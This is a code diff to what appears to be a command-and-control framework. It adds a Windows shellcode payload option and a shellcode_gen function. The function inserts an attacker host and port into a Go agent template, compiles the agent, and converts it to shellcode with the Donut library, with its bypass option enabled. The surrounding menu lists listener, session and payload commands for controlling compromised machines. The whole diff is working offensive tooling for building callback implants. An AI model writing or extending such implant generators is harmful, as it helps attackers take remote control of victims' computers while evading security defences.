@@ -4,6 +4,7 @@ import string
 import threading
 import os
 import base64
+import donut
 import shutil
 import subprocess
 import time
@@ -30,7 +31,7 @@ def help():
     Menu commands:
     ---------------------------------------
     :listener -g <IP port>   --  create a new listener
-    :payloads -c <pld>       --  create a Go agent (win/x64/exe, win/x32/exe, nix/x64/elf, win/x64/dll)
+    :payloads -c <pld>       --  create a Go agent (win/x64/exe, win/x32/exe, nix/x64/elf, win/x64/dll, win/x64/shellcode)
     :sessions -l             --  list sessions 
     :sessions -i <id>        --  interact with a session
     :sessions -k <id>        --  kill a session
@@ -162,6 +163,43 @@ def agent_gen(rip, rport, arch, sys, gocache, gohome):
         print(Fore.BLUE + "[+]" + Fore.WHITE +" The agent is available at " + out_path)
     except Exception as e:
         print(Fore.RED + "[!]" + Fore.WHITE + " Something failed during payload generation: " + str(e))
+
+# func: creating a shellcode from Go agent using Donut
+def shellcode_gen(rip, rport, arch, sys, gocache, gohome):
+    print(Fore.BLUE + "[+]" + Fore.WHITE +" Creating a go agent for "+ sys + "/" + arch)
+    rand_name = "".join(random.choice(string.ascii_letters) for i in range(8))
+    cwd = os.getcwd()
+    templ_path = cwd + "/agents/template/agent.go"
+    in_path = cwd + "/agents/" + rand_name + ".go"
+    if os.path.exists(templ_path):
+        shutil.copy(templ_path, in_path)
+    else:
+        print(Fore.RED + "[!]" + Fore.WHITE + " agent.go file not found")
+    try:
+        with open(in_path) as f:
+            host = f.read().replace("<HOST>",rip)
+            with open(in_path, "w") as f:
+                f.write(host)
+                f.close()
+        with open(in_path) as f:
+            port = f.read().replace("<PORT>",rport)
+            with open(in_path, "w") as f:
+                f.write(port)
+                f.close()
+        if sys == "windows":
+            out_path = cwd + "/agents/" + rand_name + ".exe"
+        else:
+            out_path = cwd + "/agents/" + rand_name
+        subprocess.run(["go","build","-o",out_path,in_path], check=True, env={'GOOS':sys, 'GOARCH':arch,'GOCACHE':gocache, 'HOME':gohome})
+        print(Fore.BLUE + "[+]" + Fore.WHITE +" Generating a shellcode from" + rand_name + " agent" )
+        shellcode = donut.create(file=out_path, arch=2,bypass=1)
+        out_path = cwd + "/agents/" + rand_name + ".bin"
+        with open(out_path, "wb") as f:
+                f.write(shellcode)
+                f.close()
+        print(Fore.BLUE + "[+]" + Fore.WHITE +" The agent is available at " + out_path)
+    except Exception as e:
+        print(Fore.RED + "[!]" + Fore.WHITE + " Something failed during shellcode generation: " + str(e))
 
 # func: tasking agent to get hostname
 def gethost(remote_target):
@@ -341,6 +379,8 @@ if __name__ == '__main__':
                             agent_gen(host_ip, str(host_port), 'amd64', 'linux', gocache, gohome)
                         if inp.split(" ")[2] == "win/x64/dll":
                             dll_gen(host_ip, str(host_port), 'amd64', 'windows', gocache, gohome)
+                        if inp.split(" ")[2] == "win/x64/shellcode":
+                            shellcode_gen(host_ip, str(host_port), 'amd64', 'windows', gocache, gohome)
 
             if inp.split(" ")[0] == ":sessions":
                 sessions_counter = 1
